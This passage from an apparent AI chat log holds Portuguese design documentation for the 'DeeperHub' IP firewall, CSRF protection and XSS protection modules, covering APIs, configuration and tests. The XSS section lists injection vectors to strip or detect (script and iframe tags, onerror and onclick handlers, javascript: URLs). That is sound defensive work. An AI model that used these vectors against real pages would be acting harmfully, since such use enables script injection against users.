    *   **Se Não Permitido ou Erro:** Chama `DeeperHub.Security.IPFirewallService.is_blocked?(client_ip)`.
        *   **Se Bloqueado (`true`):**
            *   Loga a tentativa de acesso bloqueada.
            *   Incrementa métrica `requests_blocked_by_firewall`.
            *   Retorna uma resposta `403 Forbidden` e interrompe (`halt`) a `conn`.
        *   **Se Não Bloqueado ou Erro na Verificação de Bloqueio:** A requisição prossegue (ou trata o erro de verificação como um \"permitir com aviso\").
3.  **Requisição Prossegue:** Se não bloqueado/explicitamente permitido, continua para os próximos plugs.

### Fluxo de Bloqueio de IP (Permanente)

1.  **Solicitação de Bloqueio:** Administrador chama `IPFirewallService.block_ip(ip, reason, nil, metadata)`.
2.  **`IPFirewallService`:**
    *   Valida o formato do IP e os parâmetros.
    *   Cria/Atualiza um registro `IPBlock` no banco de dados (via `Core.Repo`).
    *   Se a persistência for bem-sucedida:
        *   Atualiza o `SecurityCache` adicionando o IP à lista de bloqueados (sem TTL se o bloqueio for permanente).
        *   Registra a ação no `DeeperHub.Audit`.
        *   (Opcional) Publica um evento `ip_blocked` no `Core.EventBus`.
    *   Retorna `{:ok, block_info}` ou `{:error, reason}`.

## 📡 6. API (Funções Públicas do Módulo)

### 6.1. `DeeperHub.Security.IPFirewallService.is_blocked?(ip_address :: String.t()) :: boolean()`

*   **Descrição:** Verifica se um IP está atualmente na blocklist (considerando TTLs de bloqueios temporários).
*   **Retorno:** `true` se bloqueado, `false` caso contrário.

### 6.2. `DeeperHub.Security.IPFirewallService.is_allowed?(ip_address :: String.t()) :: boolean()`

*   **Descrição:** Verifica se um IP está atualmente na allowlist (considerando TTLs).

### 6.3. `DeeperHub.Security.IPFirewallService.block_ip(ip_address :: String.t(), reason :: String.t(), duration_seconds :: integer() | nil, metadata :: map() | nil) :: {:ok, IPBlock.t()} | {:error, Ecto.Changeset.t() | term()}`

*   **Descrição:** Adiciona um IP à blocklist.
*   **`duration_seconds`:** `nil` para permanente, ou número de segundos para bloqueio temporário.
*   **`metadata`:** Ex: `%{blocked_by: \"admin_user_id\", ticket_ref: \"SUP-123\"}`.
*   **Retorno:** Struct `IPBlock` salva ou erro.

### 6.4. `DeeperHub.Security.IPFirewallService.allow_ip(ip_address :: String.t(), reason :: String.t(), duration_seconds :: integer() | nil, metadata :: map() | nil) :: {:ok, IPAllow.t()} | {:error, Ecto.Changeset.t() | term()}`

*   **Descrição:** Adiciona um IP à allowlist.
*   **Retorno:** Struct `IPAllow` salva ou erro.

### 6.5. `DeeperHub.Security.IPFirewallService.unblock_ip(ip_address :: String.t(), metadata :: map() | nil) :: :ok | {:error, :not_found | term()}`

*   **Descrição:** Remove um IP da blocklist (e do cache).
*   **`metadata`:** Ex: `%{unblocked_by: \"admin_user_id\"}`.

### 6.6. `DeeperHub.Security.IPFirewallService.disallow_ip(ip_address :: String.t(), metadata :: map() | nil) :: :ok | {:error, :not_found | term()}`

*   **Descrição:** Remove um IP da allowlist (e do cache).

### 6.7. `DeeperHub.Security.IPFirewallService.list_blocked_ips(opts :: keyword()) :: {:ok, list(IPBlock.t())}`

*   **Descrição:** Lista IPs bloqueados (primariamente do banco de dados para gerenciamento).
*   **`opts`:** `:include_expired` (boolean), `:limit`, `:offset`.

### 6.8. `DeeperHub.Security.IPFirewallService.list_allowed_ips(opts :: keyword()) :: {:ok, list(IPAllow.t())}`

*   **Descrição:** Lista IPs permitidos.

## ⚙️ 7. Configuração

Via `DeeperHub.Core.ConfigManager` e/ou `DeeperHub.Security.Policy.SecurityPolicyManager`:

*   **`[:security, :ip_firewall, :enabled]`** (Boolean): Habilita/desabilita o firewall de IP. (Padrão: `true`)
*   **`[:security, :ip_firewall, :default_block_duration_seconds]`** (Integer): Duração padrão para bloqueios temporários. (Padrão: `3600` - 1 hora)
*   **`[:security, :ip_firewall, :default_allow_duration_seconds]`** (Integer): Duração padrão para permissões temporárias.
*   **`[:security, :ip_firewall, :permanent_blocked_ips]`** (List de Strings/CIDR): Lista de IPs/ranges permanentemente bloqueados carregados na inicialização.
*   **`[:security, :ip_firewall, :permanent_allowed_ips]`** (List de Strings/CIDR): Lista de IPs/ranges permanentemente permitidos.
*   **`[:security, :ip_firewall, :cache_load_on_startup]`** (Boolean): Se deve carregar as listas permanentes do DB para o cache ETS na inicialização. (Padrão: `true`)
*   **`[:security, :ip_firewall, :cleanup_interval_minutes]`** (Integer): Intervalo para o worker que remove entradas expiradas do *banco de dados* (o cache ETS lida com seus próprios TTLs). (Padrão: `1440` - 24 horas)
*   **`[:security, :ip_firewall, :plug, :mode]`** (Atom): Modo de operação do `IPFirewallPlug` (`:enforce` ou `:monitor`). (Padrão: `:enforce`)
*   **`[:security, :ip_firewall, :plug, :whitelist_paths]`** (List de Strings/Regex): Caminhos que devem ignorar a verificação do firewall.

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.ConfigManager`, `Core.Logger`, `Core.Metrics`, `Core.Repo`.
*   `DeeperHub.Security.Cache.SecurityCache`: Para caching de IPs.
*   `DeeperHub.Security.Policy.SecurityPolicyManager`: Para obter políticas.
*   `DeeperHub.Audit`: Para registrar alterações.
*   `DeeperHub.Shared.Utils.ValidationUtils` (ou similar): Para validar formatos de IP/CIDR.

### 8.2. Bibliotecas Externas

*   `Ecto`: Para persistência de regras permanentes.
*   Pode usar bibliotecas para manipulação de CIDR se não for feito manualmente.

## 🤝 9. Como Usar / Integração

*   **Plug no Pipeline Phoenix:**
    ```elixir
    # Em lib/deeper_hub_web/router.ex
    pipeline :api do
      plug DeeperHub.Security.Plugs.IPFirewallPlug, mode: :enforce # ou :monitor
      # ... outros plugs ...
    end
    ```
*   **Verificação Programática:**
    ```elixir
    if DeeperHub.Security.IPFirewallService.is_blocked?(client_ip) do
      # Lógica para lidar com IP bloqueado
    end
    ```

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar bloqueio e permissão de IPs/CIDRs (temporários e permanentes).
*   Testar a lógica de expiração de entradas no cache e (se aplicável) no DB.
*   Testar a precedência (allowlist > blocklist).
*   Testar o `IPFirewallPlug` em modo `:enforce` e `:monitor`.
*   Testar a carga de listas iniciais.
*   Localização: `test/deeper_hub/security/ip_firewall_service/`.

### 10.2. Métricas

*   `deeper_hub.security.ip_firewall.requests_checked.count`
*   `deeper_hub.security.ip_firewall.requests_blocked.count` (tags: `reason`)
*   `deeper_hub.security.ip_firewall.requests_allowed_by_whitelist.count`
*   `deeper_hub.security.ip_firewall.blocked_ips.gauge` (Gauge): Número de IPs atualmente na blocklist (cache).
*   `deeper_hub.security.ip_firewall.allowed_ips.gauge` (Gauge): Número de IPs atualmente na allowlist (cache).
*   `deeper_hub.security.ip_firewall.db_cleanup.items_removed.count`

### 10.3. Logs

*   **Nível INFO:** IP adicionado/removido da allowlist/blocklist (com motivo e quem fez).
*   **Nível WARNING:** Requisição bloqueada pelo firewall (com IP e path).
*   **Nível ERROR:** Falha ao persistir/remover regra no banco de dados. Erro ao carregar listas iniciais.

### 10.4. Telemetria

*   `[:deeper_hub, :security, :ip_firewall, :ip_check]`
    *   Metadados: `%{ip_address: ip, result: :allowed | :blocked | :whitelisted, path: path}`
*   `[:deeper_hub, :security, :ip_firewall, :list_modified]`
    *   Metadados: `%{list_type: :blocklist | :allowlist, action: :added | :removed, ip_address: ip, reason: reason, duration_seconds: dur, admin_id: id}`

## ❌ 11. Tratamento de Erros

*   **Falha no Cache:** Se o `SecurityCache` estiver indisponível, o serviço pode tentar consultar o banco de dados diretamente para regras permanentes, mas isso terá impacto na performance. Deve logar criticamente.
*   **Falha no Banco de Dados:** Falhas ao persistir regras permanentes devem ser logadas e, possivelmente, tentar novamente. A operação no cache pode ser feita de forma otimista.

## 🛡️ 12. Considerações de Segurança (do próprio Módulo)

*   **Autorização para Modificar Listas:** As funções `block_ip`, `allow_ip`, etc., devem ser protegidas e só acessíveis por administradores ou sistemas automatizados autorizados (ex: IDS).
*   **Prevenção de Auto-Bloqueio:** Cuidado para não bloquear IPs de sistemas essenciais ou de administradores, a menos que intencional. A allowlist pode ajudar aqui.
*   **Tamanho das Listas:** Listas de bloqueio/permissão muito grandes podem impactar a performance da inicialização e do cache, mesmo com ETS. Considere limites ou estratégias de paginação para gerenciamento.

## 🧑‍💻 13. Contribuição

*   Ao adicionar novas fontes de IPs para bloqueio/permissão (ex: feeds de threat intelligence), integre-as de forma que atualizem o `IPFirewallService`.
*   Garanta que os motivos para bloqueio/permissão sejam claros e auditáveis.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Suporte para regras de firewall mais complexas (ex: por país, ASN, não apenas IP). Isso começaria a sobrepor com WAFs.
*   [ ] Integração com feeds de reputação de IP externos para popular dinamicamente a blocklist.
*   [ ] UI administrativa para gerenciamento fácil das listas de IP.
*   [ ] Permitir que as políticas de `SecurityPolicyManager` definam diferentes perfis de firewall (ex: \"agressivo\", \"moderado\") que ajustam automaticamente durações e limiares.
*   [ ] Adicionar um modo \"monitor\" mais granular, que loga o que *seria* bloqueado mas ainda permite a requisição (além do plug global).

---

*Última atualização: 2025-05-11*

---

Este cobre o Firewall de IP! Agora, o `DeeperHub.Security.Policy.SecurityPolicyManager` que acabamos de referenciar bastante seria um bom próximo passo para ver como essas configurações são gerenciadas, ou prefere focar em outro aspecto da segurança como `DDoSProtection` ou `CSRFProtection`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Ok, já detalhamos o `DeeperHub.Security.Policy.SecurityPolicyManager`.

Dado que já cobrimos vários componentes de segurança importantes (`FraudDetection`, `BruteForceProtection`, `IPFirewallService`, `DeviceFingerprint`, `GeoLocationService`, `BehavioralAnalysis`, `RiskAssessment`, `SecurityPolicyManager`), podemos agora focar em outras camadas de proteção que são comuns em aplicações web.

Vamos detalhar o `DeeperHub.Security.CsrfProtection`.

---

# Módulo: `DeeperHub.Security.CsrfProtection` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.Security.CsrfProtection`

O módulo `DeeperHub.Security.CsrfProtection` é responsável por proteger a aplicação DeeperHub contra ataques de **Cross-Site Request Forgery (CSRF)**. Um ataque CSRF ocorre quando um site malicioso, email, blog, mensagem instantânea ou programa faz com que o navegador de um usuário autenticado realize uma ação indesejada em um site confiável.

Para mitigar isso, este módulo implementa o padrão de **token sincronizador (Synchronizer Token Pattern)**. Ele gera tokens únicos e imprevisíveis por sessão que são embutidos em formulários e verificados em requisições que modificam o estado (POST, PUT, DELETE, PATCH), garantindo que a requisição se originou da própria aplicação e não de uma fonte externa maliciosa. 😊

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Geração de Tokens CSRF (`generate_token/2`):**
    *   Gerar tokens CSRF únicos, seguros e específicos para cada sessão de usuário.
    *   Os tokens devem ser suficientemente aleatórios e difíceis de adivinhar.
    *   Associar tokens a um contexto opcional (ex: nome do formulário) para maior segurança (double submit cookie com token no corpo/header).
*   **Armazenamento e Gerenciamento de Tokens:**
    *   Armazenar o token CSRF esperado de forma segura, tipicamente na sessão do usuário ou em um cookie seguro (HttpOnly, SameSite).
    *   Gerenciar o ciclo de vida dos tokens, incluindo expiração (opcional, mas recomendado) e invalidação.
*   **Validação de Tokens CSRF (`validate_token/3`):**
    *   Verificar se o token CSRF enviado em uma requisição (ex: em um header `X-CSRF-Token` ou campo de formulário `_csrf_token`) corresponde ao token esperado para a sessão do usuário.
    *   Rejeitar a requisição se o token estiver ausente, for inválido ou não corresponder.
*   **Integração com a Aplicação Web (Plugs):**
    *   Fornecer um Plug Phoenix (ex: `CsrfProtectionPlug`) para automatizar a geração e verificação de tokens para rotas relevantes.
    *   Facilitar a inclusão de tokens em formulários HTML (ex: `form_field/2`).
    *   Fornecer tokens para serem incluídos em cabeçalhos de requisições AJAX por aplicações frontend (ex: `security_headers/2`).
*   **Configurabilidade:**
    *   Permitir a configuração do nome do cookie/header/campo de formulário para o token.
    *   Configurar o tempo de vida dos tokens.
    *   Definir quais métodos HTTP requerem verificação CSRF (geralmente todos exceto GET, HEAD, OPTIONS, TRACE).
*   **Invalidação de Tokens:**
    *   Invalidar tokens CSRF após o uso (para tokens de uso único, se aplicável) ou quando a sessão do usuário é encerrada (`invalidate_tokens/1`).
*   **Observabilidade:**
    *   Registrar métricas sobre tokens gerados, validados, falhas de validação.
    *   Logar tentativas de CSRF bloqueadas.
*   **Auditoria:**
    *   Registrar eventos de falha na validação de CSRF no sistema de auditoria.

## 🏗️ 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Security.CsrfProtection` (Fachada Pública):**
    *   Ponto de entrada para as funcionalidades de CSRF.
    *   Delega para o `CsrfProtectionService`.
2.  **`DeeperHub.Security.CsrfProtection.Services.CsrfProtectionService` (GenServer ou Módulo Funcional):**
    *   **Responsabilidade:** Lógica principal para geração, armazenamento (se não for puramente na sessão do cliente/cookie) e validação de tokens.
    *   **Estado (se GenServer, para tokens stateful ou estatísticas):** Pode manter um registro de tokens emitidos recentemente ou estatísticas de validação, embora o padrão mais comum seja stateless no backend e o token esperado seja armazenado na sessão do usuário.
    *   **Interações:**
        *   `DeeperHub.Auth.SessionManager` ou `Plug.Session`: Para obter/definir o token CSRF esperado na sessão do usuário.
        *   `DeeperHub.Shared.Utils.SecurityUtils`: Para gerar bytes aleatórios seguros para os tokens.
        *   `DeeperHub.Core.ConfigManager`: Para obter configurações (nome do cookie, TTL, etc.).
3.  **`DeeperHub.Security.CsrfProtection.Plug.CsrfProtectionPlug` (Phoenix Plug):**
    *   **Responsabilidade:** Middleware para ser adicionado aos pipelines do Phoenix Router.
    *   **No fluxo de entrada:** Para requisições que modificam estado (POST, PUT, etc.), extrai o token da requisição (header ou corpo) e o valida contra o token na sessão. Se inválido, rejeita a requisição (ex: retorna 403).
    *   **No fluxo de saída (opcional, para garantir que o token esteja sempre disponível):** Pode garantir que um token CSRF seja gerado e enviado ao cliente (ex: em um cookie) se ainda não existir na sessão.
4.  **Funções Helper (em `CsrfProtection` ou em um módulo de views/templates):**
    *   `form_field/2`: Para gerar o campo `<input type=\"hidden\">` em formulários HTML.
    *   `security_headers/2`: Para fornecer o token a ser incluído em headers por clientes JavaScript.

### 3.2. Estrutura de Diretórios (Proposta)

```
lib/deeper_hub/security/csrf_protection/
├── csrf_protection.ex                # Fachada Pública
│
├── services/
│   └── csrf_protection_service.ex    # Lógica principal de geração/validação
│
├── plug/                             # (Pode estar em deeper_hub_web/plugs se usando Phoenix)
│   └── csrf_protection_plug.ex
│
└── supervisor.ex                     # Supervisor (se CsrfProtectionService for GenServer)
```
*(Os módulos `CsrfProtectionAdapter` e `CsrfProtectionBehaviour` da documentação original podem ser simplificados se o `CsrfProtectionService` for a implementação principal e a fachada o chamar diretamente.)*

### 3.3. Decisões de Design Importantes

*   **Padrão de Token Sincronizador:** O design mais comum e recomendado é usar o padrão de token sincronizador.
    1.  Na primeira resposta ao cliente (ou quando a sessão é criada), gerar um token CSRF secreto.
    2.  Armazenar este token secreto em um cookie seguro (HttpOnly, SameSite=Lax ou Strict) OU na sessão do servidor.
    3.  Para cada formulário ou requisição AJAX que modifica estado, embutir um token CSRF (que pode ser o mesmo token secreto ou um derivado dele, como um HMAC do token secreto + ID da sessão).
    4.  No servidor, para cada requisição que modifica estado:
        *   Se o token secreto está no cookie: comparar o token do cookie com o token enviado no corpo/header.
        *   Se o token secreto está na sessão do servidor: comparar o token da sessão do servidor com o token enviado no corpo/header.
*   **Stateless vs. Stateful Tokens CSRF no Backend:**
    *   **Stateless (Double Submit Cookie):** O servidor não precisa armazenar o token CSRF. Ele envia um token em um cookie e espera o mesmo token de volta no corpo/header da requisição. Fácil de escalar.
    *   **Stateful (Token na Sessão):** O servidor armazena o token CSRF esperado na sessão do usuário no backend. Mais seguro contra algumas vulnerabilidades de subdomínio, mas requer gerenciamento de sessão no backend.
    *   Para DeeperHub, que já tem um `SessionManager`, armazenar o token CSRF esperado na sessão do servidor parece uma abordagem robusta.
*   **Tokens por Requisição vs. Por Sessão:**
    *   **Por Sessão (mais comum):** Um token CSRF é gerado por sessão e é válido para múltiplas requisições dentro dessa sessão.
    *   **Por Requisição (mais seguro, mas mais complexo):** Um novo token é gerado para cada formulário/requisição. Aumenta a complexidade no cliente.
    *   Recomenda-se iniciar com tokens por sessão.
*   **Validação para Métodos Seguros:** A proteção CSRF é crucial para métodos HTTP que alteram estado (`POST`, `PUT`, `DELETE`, `PATCH`). Métodos seguros (`GET`, `HEAD`, `OPTIONS`, `TRACE`) geralmente não precisam de proteção CSRF, pois não devem ter efeitos colaterais.

## 🛠️ 4. Casos de Uso Principais

*   **Usuário Submete um Formulário Web:**
    *   Ao renderizar o formulário, `CsrfProtection.form_field/2` é usado para embutir o token CSRF.
    *   Quando o usuário submete o formulário (POST), o token é incluído.
    *   O `CsrfProtectionPlug` intercepta a requisição, extrai o token do formulário e o token da sessão, e os compara. Se forem iguais, a requisição prossegue. Senão, é bloqueada.
*   **Aplicação Frontend (SPA) Envia Requisição AJAX:**
    *   Ao carregar a SPA, o cliente pode solicitar o token CSRF atual (ex: de um endpoint `/api/v1/csrf-token` ou o token é fornecido em um meta tag/cookie não-HttpOnly).
    *   Para cada requisição `POST`, `PUT`, `DELETE`, a SPA inclui o token em um header customizado (ex: `X-CSRF-Token`).
    *   O `CsrfProtectionPlug` no backend verifica este header contra o token na sessão.

## 🌊 5. Fluxos Importantes

### Fluxo de Proteção CSRF para Requisição POST (com token na sessão)

1.  **Cliente (Navegador):**
    *   Usuário acessa uma página com um formulário.
    *   O servidor, ao renderizar a página, garante que um token CSRF (`expected_csrf_token`) está na sessão do usuário e também insere este token (ou um derivado) como um campo oculto no formulário.
2.  **Submissão do Formulário:** Usuário submete o formulário (requisição POST). O navegador envia os cookies da sessão (que podem conter o `expected_csrf_token` se você usar a técnica de cookie também) e os dados do formulário (que incluem o `submitted_csrf_token`).
3.  **`DeeperHub.Security.CsrfProtection.Plug.CsrfProtectionPlug` (Backend):**
    *   Intercepta a requisição POST.
    *   Extrai o `expected_csrf_token` da sessão do usuário (via `SessionManager`).
    *   Extrai o `submitted_csrf_token` do corpo do formulário (ou de um header `X-CSRF-Token` para AJAX).
    *   **Validação:** Compara `expected_csrf_token` com `submitted_csrf_token`.
        *   **Match:** A requisição é considerada legítima e prossegue para o controller. Opcionalmente, um novo token CSRF pode ser gerado e atualizado na sessão para a próxima requisição (para tokens de uso único ou rotacionados).
        *   **Mismatch ou Ausente:** A requisição é considerada uma possível tentativa de CSRF. O plug retorna uma resposta de erro (ex: 403 Forbidden) e interrompe o processamento. Um log de segurança/auditoria é gerado.
4.  **Controller (se a validação CSRF passar):** Processa a requisição normalmente.

## 📡 6. API (Funções Públicas da Fachada)

### 6.1. `DeeperHub.Security.CsrfProtection.generate_token(session_id :: String.t(), context :: map() | nil) :: {:ok, String.t()} | {:error, term()}`

*   **Descrição:** Gera (ou recupera da sessão) um token CSRF para a sessão especificada. Se um token já existir na sessão e for válido, pode retorná-lo. Caso contrário, gera um novo, o armazena na sessão e o retorna.
*   **`context`:** Pode ser usado para gerar tokens específicos para diferentes formulários/ações, embora um token por sessão seja mais comum.
*   **Retorno:** O token CSRF como string.

### 6.2. `DeeperHub.Security.CsrfProtection.validate_token(session_id :: String.t(), submitted_token :: String.t(), context :: map() | nil) :: :ok | :error`

*   **Descrição:** Valida um token CSRF submetido contra o esperado para a sessão.
*   **Retorno:** `:ok` se válido, `:error` (ou `{:error, :invalid_token}`) se inválido.

### 6.3. `DeeperHub.Security.CsrfProtection.form_field(session_id :: String.t(), opts :: keyword()) :: {:ok, String.t()}`

*   **Descrição:** Gera a string HTML para um campo de formulário oculto contendo o token CSRF.
*   **`opts`:** `:field_name` (Nome do campo, padrão: `\"_csrf_token\"`).
*   **Exemplo de Retorno:** `{:ok, \"<input type=\\\"hidden\\\" name=\\\"_csrf_token\\\" value=\\\"random_token_string\\\" />\"}`

### 6.4. `DeeperHub.Security.CsrfProtection.get_token_for_header(session_id :: String.t()) :: {:ok, String.t()}` (Nova Sugestão)

*   **Descrição:** Obtém o token CSRF atual para ser usado em um cabeçalho HTTP (ex: `X-CSRF-Token`) por clientes AJAX. Similar a `generate_token/2` mas com a intenção clara de uso em header.

### 6.5. `DeeperHub.Security.CsrfProtection.invalidate_tokens(session_id :: String.t()) :: :ok`

*   **Descrição:** Invalida/remove o token CSRF da sessão do usuário (ex: no logout).

## ⚙️ 7. Configuração

Via `DeeperHub.Core.ConfigManager` e/ou `DeeperHub.Security.Policy.SecurityPolicyManager`:

*   **`[:security, :csrf_protection, :enabled]`** (Boolean): Habilita/desabilita a proteção CSRF. (Padrão: `true`)
*   **`[:security, :csrf_protection, :token_name_in_session]`** (String): Chave usada para armazenar o token CSRF na sessão do servidor. (Padrão: `\"_csrf_token_secret\"`)
*   **`[:security, :csrf_protection, :form_field_name]`** (String): Nome do campo de formulário esperado. (Padrão: `\"_csrf_token\"`)
*   **`[:security, :csrf_protection, :header_name]`** (String): Nome do cabeçalho HTTP esperado. (Padrão: `\"X-CSRF-Token\"`)
*   **`[:security, :csrf_protection, :methods_to_protect]`** (List de Strings): Métodos HTTP que requerem validação CSRF. (Padrão: `[\"POST\", \"PUT\", \"DELETE\", \"PATCH\"]`)
*   **`[:security, :csrf_protection, :token_lifespan_seconds]`** (Integer | `:session`): Tempo de vida do token CSRF. Se `:session`, vive enquanto a sessão do usuário viver. (Padrão: `:session`)
*   **`[:security, :csrf_protection, :rotate_token_on_get]`** (Boolean): Se um novo token deve ser gerado e retornado em requisições GET (para SPAs que precisam de um token fresco). (Padrão: `false`)

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.ConfigManager`: Para configurações.
*   `DeeperHub.Core.Logger`: Para logging de falhas.
*   `DeeperHub.Core.Metrics`: Para métricas de CSRF.
*   `DeeperHub.Auth.SessionManager` (ou `Plug.Session`): Para armazenar/recuperar o token CSRF esperado da sessão do usuário.
*   `DeeperHub.Shared.Utils.SecurityUtils`: Para geração de tokens aleatórios seguros.
*   `DeeperHub.Audit`: Para registrar tentativas de CSRF bloqueadas.

### 8.2. Bibliotecas Externas

*   Nenhuma específica, mas depende do mecanismo de sessão usado (ex: `Plug.Session`).

## 🤝 9. Como Usar / Integração

*   **Com Phoenix:** Adicionar `DeeperHub.Security.CsrfProtection.Plug.CsrfProtectionPlug` ao pipeline de rotas que manipulam o estado (tipicamente o pipeline `:browser` se houver formulários web, ou um pipeline `:api_session_protected` para SPAs que usam sessões).
    ```elixir
    # lib/deeper_hub_web/router.ex
    pipeline :browser_csrf do
      plug :accepts, [\"html\"]
      plug :fetch_session
      plug :fetch_live_flash
      plug DeeperHub.Security.CsrfProtection.Plug.CsrfProtectionPlug # Adicionar aqui
      plug :protect_from_forgery # Plug padrão do Phoenix, pode ser redundante ou complementar
    end

    scope \"/\", DeeperHubWeb do
      pipe_through [:browser, :browser_csrf] # Aplicar ao escopo apropriado
      # ... rotas ...
    end
    ```
*   **Em Formulários HTML (Phoenix):**
    ```eex
    <%= form_for @changeset, @action, fn f -> %>
      <%= DeeperHub.Security.CsrfProtection.form_field_tag(conn) %> # Helper para o plug padrão do Phoenix
      <%# Ou se usando a API diretamente: %>
      <%# {:ok, csrf_input} = DeeperHub.Security.CsrfProtection.form_field(conn.assigns.session_id) %>
      <%# <%= raw csrf_input %> 
      ...
    <% end %>
    ```
*   **Em Clientes JavaScript (SPAs):**
    1.  Obter o token CSRF do backend (ex: de um endpoint `/api/csrf-token` ou de um cookie não-HttpOnly se a política SameSite permitir).
    2.  Incluir o token em um header customizado (ex: `X-CSRF-Token`) para todas as requisições AJAX que modificam estado.

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar se requisições POST/PUT/DELETE sem token CSRF são bloqueadas.
*   Testar se requisições com token CSRF inválido/incorreto são bloqueadas.
*   Testar se requisições com token CSRF válido são permitidas.
*   Testar a geração e invalidação de tokens.
*   Testar o funcionamento do `CsrfProtectionPlug`.
*   Localização: `test/deeper_hub/security/csrf_protection/`.

### 10.2. Métricas

*   `deeper_hub.security.csrf.tokens_generated.count`
*   `deeper_hub.security.csrf.validation.success.count`
*   `deeper_hub.security.csrf.validation.failure.count` (tags: `reason` (`missing_token`, `invalid_token`))
*   `deeper_hub.security.csrf.requests_blocked.count`

### 10.3. Logs

*   **Nível WARNING:** Falha na validação do token CSRF, requisição bloqueada.
*   **Nível INFO:** Token CSRF gerado para nova sessão (se relevante).

### 10.4. Telemetria

*   `[:deeper_hub, :security, :csrf, :validation, :start | :stop | :exception]`
    *   Metadados: `%{path: path, method: method, session_id_present: boolean, token_source: :header | :form | :missing}`
    *   No `:stop`: `%{result: :valid | :invalid | :missing}`

## ❌ 11. Tratamento de Erros

*   Falhas na validação CSRF devem resultar em uma resposta de erro clara para o cliente (ex: 403 Forbidden) e a requisição não deve ser processada.
*   Erros na geração ou armazenamento do token na sessão devem ser logados criticamente, pois podem comprometer a proteção.

## 🛡️ 12. Considerações de Segurança (do próprio Módulo)

*   **Força do Token:** Os tokens CSRF devem ser gerados usando uma fonte de aleatoriedade criptograficamente segura e ter entropia suficiente.
*   **Armazenamento Seguro do Token Esperado:** Se armazenado na sessão do servidor, a segurança do mecanismo de sessão é crucial. Se usando o padrão double-submit cookie, o cookie que armazena o token deve ser HttpOnly (se possível, embora isso impeça o JS de lê-lo para AJAX) e SameSite.
*   **HTTPS:** Sempre usar HTTPS para proteger os tokens CSRF em trânsito.
*   **Não Vazar Tokens:** Tokens CSRF não devem ser expostos em URLs ou logs.
*   **Verificação de `Origin` e `Referer` Headers:** Como uma camada adicional de defesa, verificar esses headers pode ajudar, mas eles não são totalmente confiáveis e não substituem os tokens CSRF.

## 🧑‍💻 13. Contribuição

*   Garantir que o `CsrfProtectionPlug` seja aplicado a todas as rotas relevantes que modificam estado.
*   Assegurar que todos os formulários e chamadas AJAX que modificam estado incluam o token CSRF.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Implementar rotação automática de tokens CSRF após um certo número de requisições ou tempo, mesmo dentro da mesma sessão, para maior segurança.
*   [ ] Adicionar suporte para tokens CSRF específicos por formulário/ação (aumenta a complexidade, mas também a segurança).
*   [ ] Investigar o uso de cabeçalhos como `Sec-Fetch-Site` como um indicador adicional na validação CSRF (para navegadores que suportam).
*   [ ] Fornecer helpers mais robustos para integração com frameworks frontend JavaScript populares.

---

*Última atualização: 2025-05-12*

---

Proteção CSRF é essencial para aplicações web!

O próximo poderia ser `DeeperHub.Security.XssProtection` para continuarmos com as defesas contra ataques web comuns, ou prefere outro?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Excelente! Vamos agora detalhar o `DeeperHub.Security.XssProtection`, que é fundamental para proteger os usuários contra ataques de Cross-Site Scripting.

---

# Módulo: `DeeperHub.Security.XssProtection` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.Security.XssProtection`

O módulo `DeeperHub.Security.XssProtection` é dedicado a prevenir ataques de **Cross-Site Scripting (XSS)** no sistema DeeperHub. XSS é uma vulnerabilidade que permite a um invasor injetar scripts maliciosos (geralmente JavaScript) em páginas web visualizadas por outros usuários. Esses scripts podem então roubar informações da sessão do usuário, desfigurar sites, redirecionar usuários para sites maliciosos, ou realizar outras ações em nome do usuário.

Este módulo foca em duas estratégias principais:
1.  **Sanitização de Entrada:** Limpar dados fornecidos pelo usuário antes que sejam armazenados ou processados, se eles forem destinados a serem exibidos como HTML.
2.  **Codificação de Saída (Output Encoding/Escaping):** Garantir que quaisquer dados dinâmicos inseridos em páginas HTML sejam devidamente \"escapados\" para que o navegador os interprete como texto literal e não como código executável.
3.  **Configuração de Cabeçalhos de Segurança HTTP:** Utilizar cabeçalhos como Content Security Policy (CSP) para instruir o navegador sobre quais fontes de conteúdo são permitidas.

O objetivo é garantir que o conteúdo gerado pelo usuário ou dados dinâmicos sejam exibidos de forma segura, sem permitir a execução de scripts indesejados. 😊

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Sanitização de Strings e HTML (`sanitize_string/2`, `sanitize_html/2`):**
    *   Remover ou escapar tags HTML perigosas (ex: `<script>`, `<iframe>`, `onerror`).
    *   Remover ou escapar atributos HTML perigosos (ex: `onclick`, `onload`, `style` com URLs `javascript:`).
    *   Permitir uma lista configurável de tags e atributos HTML seguros (para casos de uso como editores de rich text).
*   **Verificação de Strings para Padrões XSS (`check_string/2`):**
    *   Analisar strings de entrada para detectar padrões comuns de vetores XSS.
*   **Validação e Sanitização de Parâmetros de Requisição (`validate_params/2`):**
    *   Aplicar sanitização XSS a parâmetros de entrada antes de serem usados ou armazenados, se destinados à exibição.
*   **Codificação de Saída (Contextual Escaping):**
    *   Fornecer utilitários (ou garantir que as bibliotecas de template façam isso por padrão) para escapar dados corretamente dependendo do contexto onde serão inseridos em HTML (corpo HTML, atributo HTML, JavaScript, CSS, URL).
*   **Configuração de Cabeçalhos de Segurança HTTP (`security_headers/1`):**
    *   Gerar e ajudar na configuração de cabeçalhos como:
        *   `Content-Security-Policy (CSP)`: Define fontes permitidas para scripts, estilos, imagens, etc.
        *   `X-XSS-Protection`: Habilita o filtro XSS em navegadores mais antigos (embora o CSP seja preferível).
        *   `X-Content-Type-Options: nosniff`.
*   **Registro e Alerta de Tentativas de XSS (`record_xss_attempt/3`):**
    *   Logar tentativas de injeção de XSS detectadas.
    *   Opcionalmente, notificar administradores sobre tentativas persistentes ou de alto risco.
*   **Estatísticas de XSS (`get_statistics/1`):**
